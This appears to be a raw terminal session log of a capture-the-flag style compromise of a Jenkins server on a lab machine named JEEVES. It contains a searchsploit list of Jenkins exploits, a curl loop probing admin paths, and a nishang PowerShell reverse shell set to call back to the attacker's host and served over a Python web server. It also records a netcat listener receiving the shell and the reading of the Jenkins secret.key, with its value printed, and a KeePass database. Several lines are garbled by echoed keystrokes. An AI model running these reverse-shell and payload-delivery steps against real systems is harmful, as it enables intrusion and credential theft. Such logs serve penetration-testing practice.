+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] margin: 10px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .byline p{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] text-align:left;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] color:black;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] font:bold 15px Arial, Helvetica, Sans-serif;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] text-shadow:0 2px 3px rgba(0,0,0,0.1);
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] margin-left:-5px;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] }
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] .byline p a{
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] color:blue;
+[2026-02-05 17:41:29] [w=1:tmux] [p=%1] [OUT] text-decoration:none;
+[2026-02-05 17:49:31] [w=0:tmux] [p=%0] [OUT] lllllll ll  
+[2026-02-05 17:49:42] [pane=%0] [CMD_START] searchsploit Jenkins 2.87
+[2026-02-05 17:49:42] [w=0:tmux] [p=%0] [OUT] Exploits: No Results
+[2026-02-05 17:49:42] [w=0:tmux] [p=%0] [OUT] Shellcodes: No Results
+[2026-02-05 17:49:42] [w=0:tmux] [p=%0] [OUT] Papers: No Results
+[2026-02-05 17:49:45] [pane=%0] [CMD_START] searchsploit Jenkins
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] ------------------------------------------------------------------ ---------------------------------
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Exploit Title                                                    |  Path
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] CloudBees Jenkins 2.32.1 - Java Deserialization                   | java/dos/41965.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins - Script-Console Java Execution (Metasploit)              | multiple/remote/24272.rb
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins - XStream Groovy classpath Deserialization (Metasploit)   | multiple/remote/43375.rb
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 1.523 - Persistent HTML Code                              | php/webapps/30408.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 1.578 - Multiple Vulnerabilities                          | multiple/webapps/34587.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 1.626 - Cross-Site Request Forgery / Code Execution       | java/webapps/37999.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 1.633 - Credential Recovery                               | java/webapps/38664.py
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 2.137 and Pipeline Groovy Plugin 2.61 - ACL Bypass and Me | java/remote/46572.rb
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 2.150.2 - Remote Command Execution (Metasploit)           | linux/webapps/46352.rb
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 2.235.3 - 'Description' Stored XSS                        | java/webapps/49237.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 2.235.3 - 'tooltip' Stored Cross-Site Scripting           | java/webapps/49232.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 2.235.3 - 'X-Forwarded-For' Stored XSS                    | java/webapps/49244.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 2.441 - Local File Inclusion                              | java/webapps/51993.py
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins 2.63 - Sandbox bypass in pipeline: Groovy plug-in         | java/webapps/48904.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins < 1.650 - Java Deserialization                            | java/remote/42394.py
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins build-metrics plugin 1.3 - 'label' Cross-Site Scripting   | java/webapps/47598.py
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins CI Script Console - Command Execution (Metasploit)        | multiple/remote/24206.rb
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins CLI - HTTP Java Deserialization (Metasploit)              | linux/remote/44642.rb
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins CLI - RMI Java Deserialization (Metasploit)               | java/remote/38983.rb
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins Dependency Graph View Plugin 0.13 - Persistent Cross-Site | java/webapps/47111.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting | java/webapps/47927.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins Mailer Plugin < 1.20 - Cross-Site Request Forgery (Send E | linux/webapps/44843.py
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins Plugin Script Security 1.49/Declarative 1.3.4/Groovy 2.60 | java/webapps/46453.py
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins Plugin Script Security < 1.50/Declarative < 1.3.4.1/Groov | java/webapps/46427.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins Software RakNet 3.72 - Remote Integer Underflow           | multiple/remote/33802.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] SonarQube Jenkins Plugin - Plain Text Password                    | php/webapps/30409.txt
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] ------------------------------------------------------------------ ---------------------------------
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Shellcodes: No Results
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Paper Title                                                      |  Path
+[2026-02-05 17:49:45] [w=0:tmux] [p=%0] [OUT] Jenkins Groovy Scripts Ror Red Teamers and Penetration Testers    | docs/english/47374-jenkins-groov
+[2026-02-05 17:55:19] [pane=%0] [CMD_START] vim criticalJenkinsPaths.sh
+[2026-02-05 17:55:21] [w=0:tmux] [p=%0] [OUT] "criticalJenkinsPaths.sh" [New]▽  zz0%m           >c~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   0,0-1Alli -- INSERT --0,1Allfor path in "script" "manage" "credentials" "configure" "log" "systemInfo"; do
+[2026-02-05 17:55:28] [w=0:tmux] [p=%0] [OUT] curl -s -o /dev/null -w "  Status: %{http_code}\n"
+[2026-02-05 17:55:30] [w=0:tmux] [p=%0] [OUT] 4 "http://10.129.228.112:50000/askjeeves/$path"
+[2026-02-05 17:55:30] [w=0:tmux] [p=%0] [OUT] "http://10.129.228.112:50000/askjeeves/$path"
+[2026-02-05 17:55:31] [w=0:tmux] [p=%0] [OUT] 5 done
+[2026-02-05 17:55:31] [w=0:tmux] [p=%0] [OUT] done
+[2026-02-05 17:55:33] [w=0:tmux] [p=%0] [OUT] ^[  5,1All::wq
+[2026-02-05 17:55:33] [w=0:tmux] [p=%0] [OUT] "criticalJenkinsPaths.sh" [New] 5L, 347B written
+[2026-02-05 17:56:31] [pane=%0] [CMD_START] chmod +x criticalJenkinsPaths.sh
+[2026-02-05 17:56:34] [pane=%0] [CMD_START] ./criticalJenkinsPaths.sh
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] Testing: /askjeeves/script
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] curl: (2) no URL specified
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] curl: try 'curl --help' or 'curl --manual' for more information
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] ./criticalJenkinsPaths.sh: 4: http://10.129.228.112:50000/askjeeves/script: not found
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] Testing: /askjeeves/manage
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] ./criticalJenkinsPaths.sh: 4: http://10.129.228.112:50000/askjeeves/manage: not found
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] Testing: /askjeeves/credentials
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] ./criticalJenkinsPaths.sh: 4: http://10.129.228.112:50000/askjeeves/credentials: not found
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] Testing: /askjeeves/configure
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] ./criticalJenkinsPaths.sh: 4: http://10.129.228.112:50000/askjeeves/configure: not found
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] Testing: /askjeeves/log
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] ./criticalJenkinsPaths.sh: 4: http://10.129.228.112:50000/askjeeves/log: not found
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] Testing: /askjeeves/systemInfo
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] curl: (2) no URL specified
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] curl: try 'curl --help' or 'curl --manual' for more information
+[2026-02-05 17:56:34] [w=0:tmux] [p=%0] [OUT] ./criticalJenkinsPaths.sh: 4: http://10.129.228.112:50000/askjeeves/systemInfo: not found
+[2026-02-05 18:04:06] [w=0:tmux] [p=%0] [OUT] -nv 10.129.232.75 3260nc nc                        -nv 10.129.232.75 3260n                        note browsing to http://10.129.228.112:50000 reveals an http error 404 but also a "Powered by Jetty:// 9.4.z-SNAPSHOT"
+[2026-02-05 18:04:11] [w=0:tmux] [p=%0] [OUT] rrrdate -n 10.129.232.75rl                    rlwrap nc -lnvp 6969rlwrap-lnvp
+[2026-02-05 18:04:11] [pane=%0] [CMD_START] rlwrap nc -lnvp 6969
+[2026-02-05 18:04:11] [w=0:tmux] [p=%0] [OUT] listening on [any] 6969 ...
+[2026-02-06 10:11:25] [pane=%0] [CMD_START] rlwrap nc -lnvp 6969
+[2026-02-06 10:11:25] [w=0:tmux] [p=%0] [OUT] listening on [any] 6969 ...
+[2026-02-06 10:15:53] [w=1:tmux] [p=%1] [OUT] ussrr//sshhaarre//nni/usr/share/ni
+[2026-02-06 10:15:53] [w=1:tmux] [p=%1] [OUT] Completing file
+[2026-02-06 10:15:53] [w=1:tmux] [p=%1] [OUT] nikto@    nishang/
+[2026-02-06 10:15:59] [w=1:tmux] [p=%1] [OUT] ls /usr/share/ni/usr/share/niisshhang//SShheelllls//IInnf/usr/share/nishang/Shells/Infls
+[2026-02-06 10:15:59] [w=1:tmux] [p=%1] [OUT] Completing `file'
+[2026-02-06 10:16:00] [w=1:tmux] [p=%1] [OUT] ls /usr/share/nishang/Shells/Infls /usr/share/nishang/Shells/Innv
+[2026-02-06 10:17:49] [w=1:tmux] [p=%1] [OUT] /usr/share/nishang/Shells/Invoke-/usr/share/nishang/Shells/Invoke--PPoowweer/usr/share/nishang/Shells/Invoke-PowerShell/usr/share/nishang/Shells/Invoke-PowerShelllT/usr/share/nishang/Shells/Invoke-PowerShellTcp/usr/share/nishang/Shells/Invoke-PowerShellTcpp..ppss1  
+[2026-02-06 10:17:49] [pane=%1] [CMD_START] ls /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
+[2026-02-06 10:17:49] [w=1:tmux] [p=%1] [OUT] /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
+[2026-02-06 10:18:01] [w=1:tmux] [p=%1] [OUT] Completing `file or directory'
+[2026-02-06 10:18:22] [w=1:tmux] [p=%1] [OUT] cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /tmp/shellcp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 l.ps1
+[2026-02-06 10:18:22] [pane=%1] [CMD_START] cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 /tmp/shell.ps1
+[2026-02-06 10:18:25] [w=1:tmux] [p=%1] [OUT] mp/bbot_scans/frizz_full/output.txt -aslptmmo
+[2026-02-06 10:18:27] [w=1:tmux] [p=%1] [OUT] /tmo /tmp/bbot_scans/frizz_full/output.txt -aslpmo
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] /tmo /tmp/bbot_scans/frizz_full/output.txt -aslpmp
+[2026-02-06 10:18:29] [pane=%1] [CMD_START] ls /tmp
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] 7565b76d-d051-49fa-8363-1942d6667e4b.zip
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] claude
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] claude-1000
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] parser-output.txt
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] pymp-dw7cw498
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] pymp-idi45q8k
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] pymp-td7b1yr9
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] scoped_dir7MVyye
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] Screenshot_2026-01-23_23-57-37.png
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] Screenshot_2026-01-25_17-38-53.png
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] Screenshot_2026-01-25_17-51-02.png
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] Screenshot_2026-01-25_17-55-46.png
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] Screenshot_2026-02-04_01-02-58.png
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] Screenshot_2026-02-05_17-48-14.png
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] Screenshot_2026-02-05_17-53-01.png
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] shell.ps1
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] skill-diff.txt
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] systemd-private-a0618e2964db4b1ebc517bcd7d68d009-colord.service-LcXv55
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] systemd-private-a0618e2964db4b1ebc517bcd7d68d009-haveged.service-dMulEj
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] systemd-private-a0618e2964db4b1ebc517bcd7d68d009-ModemManager.service-Ky3Lqc
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] systemd-private-a0618e2964db4b1ebc517bcd7d68d009-polkit.service-aaH6CK
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] systemd-private-a0618e2964db4b1ebc517bcd7d68d009-rsyslog.service-mVXhU9
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] systemd-private-a0618e2964db4b1ebc517bcd7d68d009-syncthing@b7h30.service-lOCkib
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] systemd-private-a0618e2964db4b1ebc517bcd7d68d009-systemd-logind.service-lZZZWK
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] systemd-private-a0618e2964db4b1ebc517bcd7d68d009-upower.service-vnwzEm
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] tmp-7bj.xpi
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] tmp-m8z.xpi
+[2026-02-06 10:18:29] [w=1:tmux] [p=%1] [OUT] tmux-1000
+[2026-02-06 10:18:50] [w=1:tmux] [p=%1] [OUT] ho $IPechhoechoo o "  "a205adc9a4657f0a02922bf7ebc5cd2cb61ab777" | sha1sum
+[2026-02-06 10:18:59] [w=1:tmux] [p=%1] [OUT] echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.13 -Port 4444' >>
+[2026-02-06 10:19:02] [w=1:tmux] [p=%1] [OUT] /tmp/shell.ps1echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.13 -Port 4444' >>/tmp/shell.ps1
+[2026-02-06 10:19:04] [w=1:tmux] [p=%1] [OUT] /tmp/shell.ps1
+[2026-02-06 10:19:36] [pane=%1] [CMD_START] echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.13 -Port 4444' >> /tmp/shell.ps1
+[2026-02-06 10:19:58] [w=1:tmux] [p=%1] [OUT] cd logscd cd /   ///ttmmpp p &&&&& & pppyyttooho t thhoonpythonn n n33 3 ---mm m http.server 80
+[2026-02-06 10:19:58] [pane=%1] [CMD_START] cd /tmp && python3 -m http.server 80
+[2026-02-06 10:19:58] [w=1:tmux] [p=%1] [OUT] Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+[2026-02-06 10:20:35] [pane=%0] [CMD_START] rlwrap nc -lnvp 6969
+[2026-02-06 10:20:35] [w=0:tmux] [p=%0] [OUT] listening on [any] 6969 ...
+[2026-02-06 10:20:51] [w=1:tmux] [p=%1] [OUT] 10.129.228.112 - - [06/Feb/2026 10:20:51] "GET /shell.ps1 HTTP/1.1" 200 -
+[2026-02-06 10:22:20] [pane=%0] [CMD_START] rlwrap nc -lnvp 4444
+[2026-02-06 10:22:20] [w=0:tmux] [p=%0] [OUT] listening on [any] 4444 ...
+[2026-02-06 10:22:23] [w=1:tmux] [p=%1] [OUT] ^C
+[2026-02-06 10:22:23] [w=1:tmux] [p=%1] [OUT] Keyboard interrupt received, exiting.
+[2026-02-06 10:22:28] [pane=%1] [CMD_START] cd /tmp && python3 -m http.server 80
+[2026-02-06 10:22:28] [w=1:tmux] [p=%1] [OUT] Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+[2026-02-06 10:22:34] [w=1:tmux] [p=%1] [OUT] 10.129.228.112 - - [06/Feb/2026 10:22:34] "GET /shell.ps1 HTTP/1.1" 200 -
+[2026-02-06 10:22:34] [w=0:tmux] [p=%0] [OUT] connect to [10.10.14.13] from (UNKNOWN) [10.129.228.112] 49679
+[2026-02-06 10:22:35] [w=0:tmux] [p=%0] [OUT] Windows PowerShell running as user kohsuke on JEEVES
+[2026-02-06 10:22:35] [w=0:tmux] [p=%0] [OUT] Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+[2026-02-06 10:23:16] [w=1:tmux] [p=%1] [OUT] ^Z^X
+[2026-02-06 10:23:16] [w=1:tmux] [p=%1] [OUT] zsh: suspended  python3 -m http.server 80
+[2026-02-06 10:23:23] [w=1:tmux] [p=%1] [OUT] 
+[2026-02-06 10:23:25] [w=1:tmux] [p=%1] [OUT] ffffuf -u http://10.129.228.112:50000/FUZZ/%2e/WEB-INF/web.xml -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200
+[2026-02-06 10:23:26] [w=1:tmux] [p=%1] [OUT] ffffuf -u http://10.129.228.112:50000/FUZZ/%2e/WEB-INF/web.xml -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200fg
+[2026-02-06 10:23:26] [w=1:tmux] [p=%1] [OUT] fg
+[2026-02-06 10:23:26] [pane=%1] [CMD_START] fg
+[2026-02-06 10:23:26] [w=1:tmux] [p=%1] [OUT] [1]  + continued  python3 -m http.server 80
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] dir
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] Directory: C:\Users\Administrator\.jenkins
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] Mode                LastWriteTime         Length Name
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] ----                -------------         ------ ----
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  10:33 PM                jobs
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  10:33 PM                logs
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  10:33 PM                nodes
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  10:44 PM                plugins
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----       12/24/2017   2:47 AM                secrets
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/8/2017   8:52 AM                updates
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  10:33 PM                userContent
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  10:33 PM                users
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  10:47 PM                war
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  10:43 PM                workflow-libs
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----         2/6/2026   3:29 PM             48 .owner
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----         2/6/2026   2:06 PM           1684 config.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----         2/6/2026   2:06 PM            156 hudson.model.UpdateCenter.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:43 PM            374 hudson.plugins.git.GitTool.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:33 PM           1712 identity.key.enc
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:46 PM             94 jenkins.CLI.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] 2/6/2026   2:07 PM          84619 jenkins.err.log
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:47 PM         360448 jenkins.exe
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:47 PM            331 jenkins.exe.config
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----         2/6/2026   2:06 PM              4 jenkins.install.InstallUtil.lastExecVersion
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:45 PM              4 jenkins.install.UpgradeWizard.state
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:46 PM            138 jenkins.model.DownloadSettings.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] 10/25/2022  12:56 PM           3024 jenkins.out.log
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----         2/6/2026   2:06 PM              4 jenkins.pid
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:46 PM            169 jenkins.security.QueueItemAuthenticatorConfiguration.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:46 PM            162 jenkins.security.UpdateSiteWarningsConfiguration.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:47 PM       74271222 jenkins.war
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----         2/6/2026   2:06 PM          38573 jenkins.wrapper.log
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:49 PM           2881 jenkins.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----         2/6/2026   2:06 PM            907 nodeMonitors.xml
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:47 PM            129 queue.xml.bak
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:33 PM             64 secret.key
+[2026-02-06 11:17:49] [w=0:tmux] [p=%0] [OUT] -a----        11/3/2017  10:33 PM              0 secret.key.not-so-secret
+[2026-02-06 11:18:05] [w=0:tmux] [p=%0] [OUT] type secret.key
+[2026-02-06 11:18:05] [w=0:tmux] [p=%0] [OUT] 58d05496da2496d09036d36c99b56f1e89cc662f3e65a4023de71de7e1df8afb
+[2026-02-06 11:27:20] [w=0:tmux] [p=%0] [OUT] cd ../../
+[2026-02-06 11:27:24] [w=0:tmux] [p=%0] [OUT] dir
+[2026-02-06 11:27:25] [w=0:tmux] [p=%0] [OUT] Directory: C:\Users
+[2026-02-06 11:27:25] [w=0:tmux] [p=%0] [OUT] Mode                LastWriteTime         Length Name
+[2026-02-06 11:27:25] [w=0:tmux] [p=%0] [OUT] ----                -------------         ------ ----
+[2026-02-06 11:27:25] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  11:07 PM                Administrator
+[2026-02-06 11:27:25] [w=0:tmux] [p=%0] [OUT] d-----        11/5/2017   9:17 PM                DefaultAppPool
+[2026-02-06 11:27:25] [w=0:tmux] [p=%0] [OUT] d-----        11/3/2017  11:19 PM                kohsuke
+[2026-02-06 11:27:25] [w=0:tmux] [p=%0] [OUT] d-r---       10/25/2017   4:46 PM                Public
+[2026-02-06 11:27:34] [w=0:tmux] [p=%0] [OUT] cd Kohsuke
+[2026-02-06 11:27:38] [w=0:tmux] [p=%0] [OUT] cd Desktop
+[2026-02-06 11:27:39] [w=0:tmux] [p=%0] [OUT] dir
+[2026-02-06 11:27:39] [w=0:tmux] [p=%0] [OUT] Directory: C:\Users\Kohsuke\Desktop
+[2026-02-06 11:27:39] [w=0:tmux] [p=%0] [OUT] Mode                LastWriteTime         Length Name
+[2026-02-06 11:27:39] [w=0:tmux] [p=%0] [OUT] ----                -------------         ------ ----
+[2026-02-06 11:27:39] [w=0:tmux] [p=%0] [OUT] -ar---        11/3/2017  11:22 PM             32 user.txt
+[2026-02-06 11:27:48] [w=0:tmux] [p=%0] [OUT] cd ../Document
+[2026-02-06 11:27:48] [w=0:tmux] [p=%0] [OUT] At line:1 char:1
+[2026-02-06 11:27:48] [w=0:tmux] [p=%0] [OUT] + cd ../Document
+[2026-02-06 11:27:48] [w=0:tmux] [p=%0] [OUT] + ~~~~~~~~~~~~~~
+[2026-02-06 11:27:48] [w=0:tmux] [p=%0] [OUT] + CategoryInfo          : ObjectNotFound: (C:\Users\Kohsuke\Document:String) [Set-Location], ItemNotFoundException
+[2026-02-06 11:27:48] [w=0:tmux] [p=%0] [OUT] + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+[2026-02-06 11:27:51] [w=0:tmux] [p=%0] [OUT] cd ../Documents
+[2026-02-06 11:27:53] [w=0:tmux] [p=%0] [OUT] dir
+[2026-02-06 11:27:53] [w=0:tmux] [p=%0] [OUT] Directory: C:\Users\Kohsuke\Documents
+[2026-02-06 11:27:53] [w=0:tmux] [p=%0] [OUT] Mode                LastWriteTime         Length Name
+[2026-02-06 11:27:53] [w=0:tmux] [p=%0] [OUT] ----                -------------         ------ ----
+[2026-02-06 11:27:53] [w=0:tmux] [p=%0] [OUT] -a----        9/18/2017   1:43 PM           2846 CEH.kdbx
+[2026-02-06 11:28:12] [w=0:tmux] [p=%0] [OUT] get CEH.kdbx
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] Directory: C:\Users\Kohsuke\Documents
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] Mode                LastWriteTime         Length Name
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] ----                -------------         ------ ----
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] -a----        9/18/2017   1:43 PM           2846 CEH.kdbx
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] At line:128 char:1
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] + Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.13 -Port 4444
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
+[2026-02-06 11:28:14] [w=0:tmux] [p=%0] [OUT] + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShellTcp
+[2026-02-06 11:28:28] [w=0:tmux] [p=%0] [OUT] dir
+[2026-02-06 11:28:28] [w=0:tmux] [p=%0] [OUT] Directory: C:\Users\Kohsuke\Documents
+[2026-02-06 11:28:28] [w=0:tmux] [p=%0] [OUT] Mode                LastWriteTime         Length Name
+[2026-02-06 11:28:28] [w=0:tmux] [p=%0] [OUT] ----                -------------         ------ ----
+[2026-02-06 11:28:28] [w=0:tmux] [p=%0] [OUT] -a----        9/18/2017   1:43 PM           2846 CEH.kdbx
+[2026-02-06 11:28:37] [w=0:tmux] [p=%0] [OUT] cd ../Downloads
